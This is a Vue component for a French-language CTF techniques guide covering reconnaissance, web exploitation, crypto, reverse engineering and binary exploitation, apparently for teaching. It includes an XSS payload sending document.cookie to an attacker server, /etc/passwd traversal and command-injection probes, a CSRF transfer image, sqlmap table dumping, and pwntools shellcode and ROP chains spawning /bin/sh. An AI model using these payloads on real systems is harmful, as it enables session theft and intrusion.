<template>
  <v-container fluid class="pa-0">
    <v-card class="ma-2">
      <v-card-title class="text-h4 text-center red--text">
        Guide des Techniques CTF
      </v-card-title>

      <v-tabs
        v-model="currentTab"
        color="red"
        align-tabs="center"
        grow
      >
        <v-tab value="recon">
          <v-icon start>mdi-magnify</v-icon>
          Reconnaissance
        </v-tab>
        <v-tab value="web">
          <v-icon start>mdi-web</v-icon>
          Web
        </v-tab>
        <v-tab value="crypto">
          <v-icon start>mdi-lock</v-icon>
          Crypto
        </v-tab>
        <v-tab value="reverse">
          <v-icon start>mdi-cog</v-icon>
          Reverse
        </v-tab>
        <v-tab value="pwn">
          <v-icon start>mdi-bug</v-icon>
          Pwn
        </v-tab>
      </v-tabs>

      <v-window v-model="currentTab">
        <!-- Reconnaissance -->
        <v-window-item value="recon">
          <v-card flat>
            <v-card-text>
              <v-list>
                <!-- Énumération des ports -->
                <v-list-item>
                  <v-list-item-content>
                    <v-list-item-title class="text-h6 font-weight-bold">
                      Énumération des ports
                    </v-list-item-title>
                    <v-list-item-subtitle>
                      <div class="mt-2">
                        <span class="font-weight-bold">Outils :</span><br>
                        • nmap : Le plus complet<br>
                        • masscan : Pour les scans rapides<br>
                        • rustscan : Ultra rapide, écrit en Rust<br>
                        • netcat : Simple mais efficace
                      </div>

                      <CodeExample
                        title="Scan de base avec Nmap"
                        description="Détection des versions de services"
                        code="nmap -sV 192.168.1.1"
                        explanation="-sV : Détecte les versions des services en cours d'exécution.<br>192.168.1.1 : Adresse IP de la cible."
                      />

                      <CodeExample
                        title="Scan de ports spécifiques"
                        code="nmap -p 22,80,443 192.168.1.1"
                        explanation="-p 22,80,443 : Scan uniquement les ports 22 (SSH), 80 (HTTP) et 443 (HTTPS)."
                      />
                    </v-list-item-subtitle>
                  </v-list-item-content>
                </v-list-item>

                <v-divider class="my-2"></v-divider>

                <!-- Énumération Web -->
                <v-list-item>
                  <v-list-item-content>
                    <v-list-item-title class="text-h6 font-weight-bold">
                      Énumération Web
                    </v-list-item-title>
                    <v-list-item-subtitle>
                      <div class="mt-2">
                        <span class="font-weight-bold">Outils :</span><br>
                        • gobuster : Énumération de répertoires et sous-domaines<br>
                        • ffuf : Fuzzing web moderne et rapide<br>
                        • nikto : Scanner de vulnérabilités web<br>
                        • sublist3r : Énumération de sous-domaines
                      </div>

                      <CodeExample
                        title="Recherche de répertoires avec Gobuster"
                        code="gobuster dir -u http://192.168.1.1 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt"
                        explanation="dir : Mode de recherche de répertoires.<br>-u http://192.168.1.1 : URL de la cible.<br>-w : Spécifie le fichier de wordlist à utiliser."
                      />
                    </v-list-item-subtitle>
                  </v-list-item-content>
                </v-list-item>

                <v-divider class="my-2"></v-divider>

                <!-- Autres exemples de reconnaissance -->
                <v-list-item>
                  <v-list-item-content>
                    <v-list-item-title class="text-h6 font-weight-bold">
                      Autres Techniques de Reconnaissance
                    </v-list-item-title>
                    <v-list-item-subtitle>
                      <CodeExample
                        title="DNS Lookup avec dig"
                        code="dig example.com"
                        explanation="Utilise 'dig' pour obtenir des informations DNS sur example.com."
                        language="bash"
                      />

                      <CodeExample
                        title="Traceroute pour trouver le chemin réseau"
                        code="traceroute example.com"
                        explanation="Affiche le chemin pris par les paquets pour atteindre example.com."
                        language="bash"
                      />

                      <CodeExample
                        title="Ping Sweep avec fping"
                        code="fping -a -g 192.168.1.0/24 2>/dev/null"
                        explanation="Scanne un réseau pour identifier les hôtes actifs."
                        language="bash"
                      />

                      <CodeExample
                        title="Recherche Whois"
                        code="whois example.com"
                        explanation="Affiche les informations d'enregistrement pour example.com."
                        language="bash"
                      />
                    </v-list-item-subtitle>
                  </v-list-item-content>
                </v-list-item>
              </v-list>
            </v-card-text>
          </v-card>
        </v-window-item>

        <!-- Web -->
        <v-window-item value="web">
          <v-card flat>
            <v-card-text>
              <v-list>
                <!-- Injection SQL -->
                <v-list-item>
                  <v-list-item-content>
                    <v-list-item-title class="text-h6 font-weight-bold">
                      Injection SQL
                    </v-list-item-title>
                    <v-list-item-subtitle>
                      <div class="mt-2">
                        <span class="font-weight-bold">Outils :</span><br>
                        • SQLmap : Automatisation d'injections SQL<br>
                        • Burp Suite : Interception et modification de requêtes<br>
                        • DBeaver : Client SQL pour l'exploitation
                      </div>

                      <CodeExample
                        title="Détection d'injection SQL avec SQLmap"
                        code="sqlmap -u &quot;http://192.168.1.1/page?id=1&quot; --dbs"
                        explanation="-u : URL vulnérable.<br>--dbs : Liste les bases de données disponibles."
                      />

                      <CodeExample
                        title="Extraction de données"
                        code="sqlmap -u &quot;http://192.168.1.1/page?id=1&quot; -D ma_base_de_donnees -T utilisateurs --dump"
                        explanation="-D : Spécifie la base de données.<br>-T : Spécifie la table.<br>--dump : Extrait les données de la table."
                      />
                    </v-list-item-subtitle>
                  </v-list-item-content>
                </v-list-item>

                <v-divider class="my-2"></v-divider>

                <!-- XSS -->
                <v-list-item>
                  <v-list-item-content>
                    <v-list-item-title class="text-h6 font-weight-bold">
                      XSS (Cross-Site Scripting)
                    </v-list-item-title>
                    <v-list-item-subtitle>
                      <div class="mt-2">
                        <span class="font-weight-bold">Types :</span><br>
                        • Reflected XSS : Injection via URL<br>
                        • Stored XSS : Persistant dans la base de données<br>
                        • DOM XSS : Manipulation du DOM côté client
                      </div>

                      <CodeExample
                        title="Payload XSS basique"
                        language="html"
                        code="<script>alert('XSS')</script>"
                        explanation="Affiche une alerte JavaScript si le site est vulnérable."
                      />

                      <CodeExample
                        title="Vol de cookie"
                        language="html"
                        code="<script>fetch('http://mon-serveur/?cookie=' + document.cookie)</script>"
                        explanation="Envoie les cookies de l'utilisateur à un serveur contrôlé par l'attaquant."
                      />
                    </v-list-item-subtitle>
                  </v-list-item-content>
                </v-list-item>

                <v-divider class="my-2"></v-divider>

                <!-- Autres exemples Web -->
                <v-list-item>
                  <v-list-item-content>
                    <v-list-item-title class="text-h6 font-weight-bold">
                      Autres Techniques d'Exploitation Web
                    </v-list-item-title>
                    <v-list-item-subtitle>
                      <CodeExample
                        title="Traversée de Répertoire"
                        code="curl http://example.com/../../etc/passwd"
                        explanation="Teste la vulnérabilité de traversée de répertoire sur le serveur."
                        language="bash"
                      />

                      <CodeExample
                        title="Injection de Commande"
                        code="curl 'http://example.com/?id=1;uname -a'"
                        explanation="Teste si le paramètre est vulnérable à l'injection de commandes."
                        language="bash"
                      />

                      <CodeExample
                        title="Exemple de CSRF"
                        language="html"
                        code="<img src='http://victim.com/transfer?amount=1000&to=attacker' />"
                        explanation="Exploite la confiance du navigateur pour envoyer des requêtes non autorisées."
                      />

                      <CodeExample
                        title="Scan WordPress avec WPScan"
                        code="wpscan --url http://example.com --enumerate u"
                        explanation="Liste les utilisateurs WordPress à l'aide de WPScan."
                        language="bash"
                      />
                    </v-list-item-subtitle>
                  </v-list-item-content>
                </v-list-item>
              </v-list>
            </v-card-text>
          </v-card>
        </v-window-item>

        <!-- Crypto -->
        <v-window-item value="crypto">
          <v-card flat>
            <v-card-text>
              <v-list>
                <!-- Encodage Base64 -->
                <v-list-item>
                  <v-list-item-content>
                    <v-list-item-title class="text-h6 font-weight-bold">
                      Encodage Base64
                    </v-list-item-title>
                    <v-list-item-subtitle>
                      <CodeExample
                        title="Encodage"
                        code="echo &quot;Hello, World!&quot; | base64"
                        explanation="Résultat : SGVsbG8sIFdvcmxkIQo="
                        language="bash"
                      />

                      <CodeExample
                        title="Décodage"
                        code="echo &quot;SGVsbG8sIFdvcmxkIQo=&quot; | base64 --decode"
                        explanation="Résultat : Hello, World!"
                        language="bash"
                      />
                    </v-list-item-subtitle>
                  </v-list-item-content>
                </v-list-item>

                <v-divider class="my-2"></v-divider>

                <!-- Chiffrement César -->
                <v-list-item>
                  <v-list-item-content>
                    <v-list-item-title class="text-h6 font-weight-bold">
                      Chiffrement César
                    </v-list-item-title>
                    <v-list-item-subtitle>
                      <CodeExample
                        title="Chiffrement (décalage de 3)"
                        language="python"
                        code="texte = \ATTACKATDAWN\\ndecalage = 3\nresultat = \\.join([chr((ord(c) - 65 + decalage) % 26 + 65) for c in texte])\nprint(resultat)  # DWWDFNDWGDZQ"
                        explanation="Exemple de chiffrement par décalage pour transformer le texte."
                      />

                      <CodeExample
                        title="Déchiffrement"
                        language="python"
                        code="texte = \DWWDFNDWGDZQ\\ndecalage = 3\nresultat = \\.join([chr((ord(c) - 65 - decalage) % 26 + 65) for c in texte])\nprint(resultat)  # ATTACKATDAWN"
                        explanation="Récupère le texte original en inversant le décalage."
                      />
                    </v-list-item-subtitle>
                  </v-list-item-content>
                </v-list-item>

                <v-divider class="my-2"></v-divider>

                <!-- Autres exemples Crypto -->
                <v-list-item>
                  <v-list-item-content>
                    <v-list-item-title class="text-h6 font-weight-bold">
                      Autres Techniques Cryptographiques
                    </v-list-item-title>
                    <v-list-item-subtitle>
                      <CodeExample
                        title="Génération d'un hash MD5"
                        code="echo -n 'password' | md5sum"
                        explanation="Génère un hash MD5 pour le mot de passe."
                        language="bash"
                      />

                      <CodeExample
                        title="Chiffrement AES avec OpenSSL"
                        code="echo 'Secret Message' | openssl enc -aes-256-cbc -a -salt -pass pass:yourpassword"
                        explanation="Utilise AES-256 pour chiffrer un message."
                        language="bash"
                      />

                      <CodeExample
                        title="Encodage ROT13"
                        code="echo 'Hello' | tr 'A-Za-z' 'N-ZA-Mn-za-m'"
                        explanation="Encode le texte en utilisant ROT13."
                        language="bash"
                      />

                      <CodeExample
                        title="Cracking de hash avec John the Ripper"
                        code="john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt"
                        explanation="Utilise une wordlist pour tenter de cracker le hash contenu dans hash.txt."
                        language="bash"
                      />
                    </v-list-item-subtitle>
                  </v-list-item-content>
                </v-list-item>
              </v-list>
            </v-card-text>
          </v-card>
        </v-window-item>

        <!-- Reverse -->
        <v-window-item value="reverse">
          <v-card flat>
            <v-card-text>
              <v-list>
                <!-- Analyse Statique -->
                <v-list-item>
                  <v-list-item-content>
                    <v-list-item-title class="text-h6 font-weight-bold">
                      Analyse Statique
                    </v-list-item-title>
                    <v-list-item-subtitle>
                      <CodeExample
                        title="Recherche de chaînes avec strings"
                        code="strings binary | grep -i \password\"
                        explanation="Extrait les chaînes lisibles d'un binaire et filtre pour 'password'."
                        language="bash"
                      />
                    </v-list-item-subtitle>
                  </v-list-item-content>
                </v-list-item>

                <v-divider class="my-2"></v-divider>

                <!-- Analyse Dynamique -->
                <v-list-item>
                  <v-list-item-content>
                    <v-list-item-title class="text-h6 font-weight-bold">
                      Analyse Dynamique
                    </v-list-item-title>
                    <v-list-item-subtitle>
                      <CodeExample
                        title="Débogage avec GDB"
                        code="gdb ./binary\n(break) break main\n(run) run\n(info) info registers"
                        explanation="Place un point d'arrêt à la fonction main, exécute le binaire et affiche les registres."
                        language="bash"
                      />
                    </v-list-item-subtitle>
                  </v-list-item-content>
                </v-list-item>

                <v-divider class="my-2"></v-divider>

                <!-- Autres exemples Reverse -->
                <v-list-item>
                  <v-list-item-content>
                    <v-list-item-title class="text-h6 font-weight-bold">
                      Autres Techniques d'Analyse Binaire
                    </v-list-item-title>
                    <v-list-item-subtitle>
                      <CodeExample
                        title="Disassemblage avec objdump"
                        code="objdump -d binary"
                        explanation="Affiche le code assembleur du binaire."
                        language="bash"
                      />

                      <CodeExample
                        title="Analyse avec radare2"
                        code="radare2 -A binary"
                        explanation="Lance une analyse complète du binaire avec radare2."
                        language="bash"
                      />

                      <CodeExample
                        title="Ouverture de Ghidra"
                        code="ghidraRun"
                        explanation="Lance Ghidra pour une analyse approfondie du binaire."
                        language="bash"
                      />
                    </v-list-item-subtitle>
                  </v-list-item-content>
                </v-list-item>
              </v-list>
            </v-card-text>
          </v-card>
        </v-window-item>

        <!-- Pwn -->
        <v-window-item value="pwn">
          <v-card flat>
            <v-card-text>
              <v-list>
                <!-- Buffer Overflow -->
                <v-list-item>
                  <v-list-item-content>
                    <v-list-item-title class="text-h6 font-weight-bold">
                      Buffer Overflow
                    </v-list-item-title>
                    <v-list-item-subtitle>
                      <CodeExample
                        title="Création d'un payload avec Pwntools"
                        language="python"
                        code="from pwn import *\n\npayload = b'A' * 100  # Remplir le buffer\npayload += p32(0xdeadbeef)  # Adresse de retour\n\nprint(payload)"
                        explanation="Crée un payload qui remplit le buffer et ajoute une adresse de retour en little-endian."
                      />
                    </v-list-item-subtitle>
                  </v-list-item-content>
                </v-list-item>

                <v-divider class="my-2"></v-divider>

                <!-- Shellcoding -->
                <v-list-item>
                  <v-list-item-content>
                    <v-list-item-title class="text-h6 font-weight-bold">
                      Shellcoding
                    </v-list-item-title>
                    <v-list-item-subtitle>
                      <CodeExample
                        title="Génération de shellcode avec Pwntools"
                        language="python"
                        code="from pwn import *\n\nshellcode = asm(shellcraft.sh())\nprint(shellcode)"
                        explanation="Utilise shellcraft.sh() pour générer un shellcode pour un shell interactif."
                      />
                    </v-list-item-subtitle>
                  </v-list-item-content>
                </v-list-item>

                <v-divider class="my-2"></v-divider>

                <!-- Autres exemples Pwn -->
                <v-list-item>
                  <v-list-item-content>
                    <v-list-item-title class="text-h6 font-weight-bold">
                      Autres Techniques d'Exploitation de Binaires
                    </v-list-item-title>
                    <v-list-item-subtitle>
                      <CodeExample
                        title="Exploitation d'une vulnérabilité de format string"
                        language="python"
                        code="from pwn import *\n\npayload = b'%x ' * 10\nprint(payload)"
                        explanation="Crée un payload pour exploiter une vulnérabilité de format string et révéler des informations de la pile."
                      />

                      <CodeExample
                        title="Création d'une ROP Chain avec Pwntools"
                        language="python"
                        code="from pwn import *\n\nelf = ELF('./binary')\nrop = ROP(elf)\nrop.call('system', [next(elf.search(b'/bin/sh'))])\nprint(rop.dump())"
                        explanation="Construit une chaîne ROP qui appelle system('/bin/sh') pour obtenir un shell."
                      />

                      <CodeExample
                        title="Injection de shellcode en mémoire"
                        language="python"
                        code="from pwn import *\n\nshellcode = asm(shellcraft.sh())\npayload = b'A' * offset + shellcode\nprint(payload)"
                        explanation="Crée un payload qui injecte du shellcode après avoir rempli le buffer avec un offset."
                      />

                      <CodeExample
                        title="Exploitation de Heap Overflow"
                        language="python"
                        code="from pwn import *\n\n# Exemple simplifié pour illustrer un heap overflow\npayload = b'A' * 64\nprint(payload)"
                        explanation="Exemple illustratif montrant comment un heap overflow peut être exploité (cas réel généralement plus complexe)."
                      />
                    </v-list-item-subtitle>
                  </v-list-item-content>
                </v-list-item>
              </v-list>
            </v-card-text>
          </v-card>
        </v-window-item>
      </v-window>
    </v-card>
  </v-container>
</template>

<script setup>
import { ref } from 'vue'
import CodeExample from '@/components/CodeExample.vue'

const currentTab = ref('recon')
</script>

<style scoped>
.v-list-item-subtitle {
  white-space: pre-line !important;
  display: block !important;
  color: rgba(255, 255, 255, 0.7) !important;
  margin-top: 8px !important;
  padding: 8px !important;
  font-size: 14px !important;
}

.v-list-item-content {
  display: block !important;
  width: 100% !important;
}

.v-list-item {
  display: block !important;
  padding: 16px !important;
  margin-bottom: 8px !important;
  background-color: rgba(0, 0, 0, 0.2) !important;
  border-radius: 4px !important;
}

.v-tab {
  text-transform: none !important;
}

code {
  background-color: rgba(0, 0, 0, 0.3);
  padding: 2px 6px;
  border-radius: 4px;
  font-family: monospace;
  color: #ff5252;
}

.font-weight-bold {
  font-weight: bold !important;
  color: white !important;
  margin-bottom: 4px !important;
  display: inline-block !important;
}

.mt-2 {
  margin-top: 12px !important;
}

.v-divider {
  margin: 16px 0 !important;
  opacity: 0.2 !important;
}

.text-h6 {
  color: white !important;
  font-size: 1.25rem !important;
  font-weight: 500 !important;
  margin-bottom: 8px !important;
}
</style>
